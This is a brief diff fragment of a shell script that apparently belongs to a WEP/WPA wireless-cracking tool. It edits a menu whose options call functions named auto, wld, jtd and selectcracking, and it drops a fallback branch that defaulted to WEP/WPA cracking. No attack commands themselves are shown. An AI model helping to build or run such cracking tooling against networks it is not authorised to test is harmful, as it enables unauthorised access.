-					3 ) jtd ; break ;;
+					1 ) echo "AUTO"; sleep 2; auto ; break ;;
+					2 ) echo "WLD"; sleep 2; wld ; break ;;
+					3 ) echo "JTD"; sleep 2; jtd ; break ;;
 					4 ) selectcracking ; break ;;
 					5 ) $clear; break;;
 					* ) echo "Unknown response. Try again" ;;
 				esac
 			done
-		else echo "No external functions loaded, defaulting to wep/wpa cracking"; selectcracking
-		fi
 }
 
 selectcracking(){
